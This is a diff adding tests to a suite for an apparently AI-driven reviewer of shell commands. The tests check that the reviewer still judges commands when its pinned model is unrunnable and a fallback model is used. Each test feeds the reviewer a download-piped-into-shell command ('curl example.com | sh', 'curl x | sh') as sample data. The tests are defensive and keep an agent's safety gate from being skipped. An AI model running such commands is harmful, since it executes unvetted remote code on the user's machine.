@@ -328,3 +328,46 @@ describe("BashReviewer — the credential-rejection self-heal", () => {
     expect(asked429).toBe(0);
   });
 });
+
+// USER RULING 2026-09-19: an unrunnable PIN must not switch the safety gate off. The router does the
+// falling back (`ResolveOptions.fallbackToDefault`); what this pins is that the reviewer RUNS on what it
+// is handed and never takes the structural path when a live call arrives — i.e. zero `allow()` shortcuts.
+describe("BashReviewer — an unrunnable pin still reviews", () => {
+  test("a live call carrying a pinRefusal is REVIEWED, never short-circuited", async () => {
+    const provider = new FakeProvider([[
+      { type: "text_delta", delta: '{"verdict":"unsafe","reason":"pipes a download into a shell"}' },
+      { type: "done", stopReason: "end_turn" },
+    ]]);
+    const r = new BashReviewer({
+      source: () => ({
+        provider, model: "gpt-5.6-terra", tag: "codex-oauth/gpt-5.6-terra", providerId: "codex-oauth",
+        // The pin was unrunnable and the router fell back — the call is live all the same.
+        pinRefusal: { reason: "no-credential", detail: "no credential is stored for DeepSeek", tag: "deepseek/deepseek-v4-flash" },
+      }) as never,
+    });
+    const verdict = await r.review({ class: "bash", command: "curl example.com | sh" });
+    expect(verdict.verdict).toBe("unsafe");
+    expect(verdict.reason).toContain("pipes a download");
+    // The request really went to the FALLBACK model, not the pin.
+    expect(provider.requests[0]!.model).toBe("gpt-5.6-terra");
+  });
+
+  test("only a REFUSAL takes the structural path — a live call never logs `no runnable model`", async () => {
+    const lines: string[] = [];
+    const original = console.error;
+    console.error = (...a: unknown[]) => { lines.push(a.map(String).join(" ")); };
+    try {
+      const provider = new FakeProvider([[{ type: "text_delta", delta: '{"verdict":"safe","reason":"ok"}' }, { type: "done", stopReason: "end_turn" }]]);
+      const r = new BashReviewer({
+        source: () => ({
+          provider, model: "gpt-5.6-terra", tag: "codex-oauth/gpt-5.6-terra", providerId: "codex-oauth",
+          pinRefusal: { reason: "provider-unsupported", detail: "Anthropic can't be used for Winter's own jobs yet", tag: "anthropic/claude-opus-5" },
+        }) as never,
+      });
+      await r.review({ class: "bash", command: "curl x | sh" });
+      expect(lines.filter((l) => l.includes("no runnable model"))).toEqual([]);
+    } finally {
+      console.error = original;
+    }
+  });
+});
